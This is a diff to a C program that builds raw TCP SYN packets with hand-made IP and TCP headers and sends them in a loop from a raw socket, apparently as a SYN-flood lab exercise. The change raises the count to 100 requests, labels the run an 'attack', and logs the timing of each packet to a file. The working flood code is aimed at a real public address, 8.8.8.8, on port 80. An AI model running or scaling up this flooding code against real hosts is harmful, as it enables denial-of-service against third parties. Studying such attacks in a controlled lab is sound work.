@@ -14,6 +14,8 @@
 #define DEST_ADDR "8.8.8.8"
 #define DEST_PORT 80
 
+#define NUM_SYN_REQ 100
+
 // Create the IP header
 void setIpHeader(struct iphdr *ip_header);
 // Checksum calculate
@@ -103,18 +105,30 @@ void pseudoHeaderTcpChecksum(struct iphdr *ip_header, struct tcphdr *tcp_header)
 
 int main() {
 
+
+
     // Create a raw socket
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if (sock < 0) {
         perror("socket() failed\n");
         return 1;
     }
+    printf("Socket() succeded\n");
 
     int on = 1;
     if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1) {
         perror("setsockopt() failed\n");
         return 1;
     }
+    printf("Setsockopt() succeded\n");
+
+    // Open file
+    FILE *file = fopen("syns_results_c.txt", "w"); 
+    if(file == NULL) {
+        perror("Fopen() failed\n");
+        return 1;
+    }
+    printf("Fopen() succeded\n");
 
     struct iphdr ip_header; // Protocol IP struct
     struct tcphdr tcp_header; // Protocol TCP struct
@@ -127,7 +141,12 @@ int main() {
 
     char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
 
-    for(int i = 0; i < 10; i++) {
+    struct timeval start_send, end_send;
+    int attackTime = 0; // For measure all of the attack time
+    int avgTime; // Average time of sending 1 packet
+    
+    // Send 100 syn requests
+    for(int i = 0; i < NUM_SYN_REQ; i++) {
 
         memset(packet, 0, sizeof(struct iphdr) + sizeof(struct tcphdr));
         
@@ -140,6 +159,7 @@ int main() {
         memcpy(packet, &ip_header, sizeof(struct iphdr));
         memcpy(packet + sizeof(struct iphdr), &tcp_header, sizeof(struct tcphdr));
 
+        gettimeofday(&start_send, 0); // Start time of sending
 
         // Send the packet
         int sent = sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
@@ -147,10 +167,18 @@ int main() {
             perror("sendto() failed\n");
             return 1;
         }
+        gettimeofday(&end_send, 0); // End time of sending
+
         printf("Sent packet. Length: %d\n", sent);
-        
+        fprintf(file, "Syn request number %d was sent.\n", i);
+        fprintf(file, "Time of sending: %ld.%ld seconds.\n\n", (end_send.tv_sec-start_send.tv_sec), (end_send.tv_usec-start_send.tv_usec));
+        attackTime += ((end_send.tv_sec*1000000 + end_send.tv_usec) - (start_send.tv_sec*1000000 + start_send.tv_usec)); // Calculate the all time
     }
 
+    fprintf(file, "Attack time: %d seconds\n", attackTime / 1000000);
+    fprintf(file, "Average time for sending packet: %d\n", attackTime / NUM_SYN_REQ);
+
+    fclose(file);
     close(sock);
     return 0;
 }
